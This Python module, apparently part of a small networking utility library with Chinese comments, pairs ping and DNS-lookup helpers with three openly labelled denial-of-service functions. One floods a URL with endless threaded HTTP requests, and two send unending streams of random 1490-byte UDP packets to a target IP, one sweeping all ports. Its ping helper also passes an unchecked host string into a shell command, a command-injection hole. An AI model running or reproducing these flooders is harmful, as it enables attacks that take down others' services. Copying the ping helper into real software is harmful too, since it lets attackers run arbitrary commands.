import os,socket,threading,requests,meo,random

headers = {
    "User-Agent": meo.net.UserAgent.FIREFOX.value
}

#本机信息
from .hostinfo import hostinfo

# ping
def ping(host):
    return os.popen("ping "+ host).read()

# 获取ip
def getip(name):
    try:
        return socket.gethostbyname(name)
    except:
        return None



# 洪水攻击
def startattack(url, speed, headers=headers):
    def attack(speed, collector = {}):
        for i in range(speed):
            try:
                r = requests.get(url, headers)
                collector['success'] += 1
            except:
                # 发送失败
                collector['err'] += speed - i
                break
    collector = {
        "success": 0,
        "err": 0,
    }
    while True:
        t1 = threading.Thread(target=attack, args=(speed, collector))
        t1.start()
        print("\r已发送{}个包，失效{}个包".format(
            collector['success'] + collector['err'],
            collector['err']
        ), end="")

# 泛洪攻击
def ddos_attack(ip, port = 1):
    sent = 0
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1490)
    while True:
        sock.sendto(bytes, (ip,port))
        sent = sent + 1
        port = port + 1
        print ("已发送 %s 个包到 %s 通过端口:%s"%(sent,ip,port))
        if port == 65534:
            port = 1
# 洪攻击
def c_ddos_attack(ip,port = 1):
    sent = 0
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1490)
    
    while True:
        sock.sendto(bytes, (ip,port))
        sent = sent + 1
        print ("已发送 %s 个包到 %s 通过端口:%s"%(sent,ip,port))

if __name__ == "__main__":
    print(ping('8.8.8.8'))